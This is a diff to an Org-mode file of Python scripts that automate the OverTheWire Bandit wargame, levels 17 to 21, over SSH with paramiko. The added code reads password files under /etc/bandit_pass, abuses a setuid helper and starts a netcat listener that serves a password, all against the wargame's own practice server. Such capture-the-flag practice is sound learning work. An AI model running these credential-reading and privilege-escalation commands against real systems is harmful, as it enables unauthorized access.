@@ -21,6 +21,9 @@
 - [[#bandit15--bandit16][Bandit15 => Bandit16]]
 - [[#bandit16--bandit17][Bandit16 => Bandit17]]
 - [[#bandit17--bandit18][Bandit17 => Bandit18]]
+- [[#bandit18--bandit19][Bandit18 => Bandit19]]
+- [[#bandit19--bandit20][Bandit19 => Bandit20]]
+- [[#bandit20--bandit21][Bandit20 => Bandit21]]
 - [[#main][Main]]
 
 * About
@@ -386,18 +389,61 @@ def bandit17():
     connect('bandit17')
 
     _, out, _ = ssh.exec_command('cat /etc/bandit_pass/bandit17')
-
     creds = credentials['bandit17']
     if len(creds) == 1:
         creds.append(out.readline())
     else:
         creds[1] = out.readline()
 
-    #credentials['bandit18'] = [os.getcwd() + "/" + file_path]
-    save()
+    _, out, _ = ssh.exec_command('diff passwords.new passwords.old')
+    passwd = re.findall(r'< .*$', out.read().decode(), re.MULTILINE)[0][2:]
 
-load()
-bandit17()
+    credentials['bandit18'] = passwd
+
+    save()
+#+end_src
+
+* Bandit18 => Bandit19
+Trying to log in with the normal =ssh= command will kick us out but with paramiko its pretty simple
+#+begin_src python :tangle ape.py
+def bandit18():
+    print("Pwning bandit18")
+    connect('bandit18')
+
+    _, out, _ = ssh.exec_command('cat readme')
+
+    credentials['bandit19'] = out.readline().strip()
+
+    save()
+#+end_src
+
+* Bandit19 => Bandit20
+#+begin_src python :tangle ape.py
+def bandit19():
+    print("Pwning bandit19")
+    connect('bandit19')
+
+    _, out, _ = ssh.exec_command('./bandit20-do cat /etc/bandit_pass/bandit20')
+
+    credentials['bandit20'] = out.readline().strip()
+
+    save()
+#+end_src
+
+* Bandit20 => Bandit21
+#+begin_src python :tangle ape.py
+def bandit20():
+    print("Pwning bandit20")
+    connect('bandit20')
+
+    port = 4444
+    _, out, _ = ssh.exec_command(f'nc -lnvp {port} < /etc/bandit_pass/bandit20 & sleep 2 && ./suconnect {port}')
+
+    passwd = [x.strip() for x in out.readlines() if len(x) == 33][0]
+
+    credentials['bandit21'] = passwd
+
+    save()
 #+end_src
 
 * Main
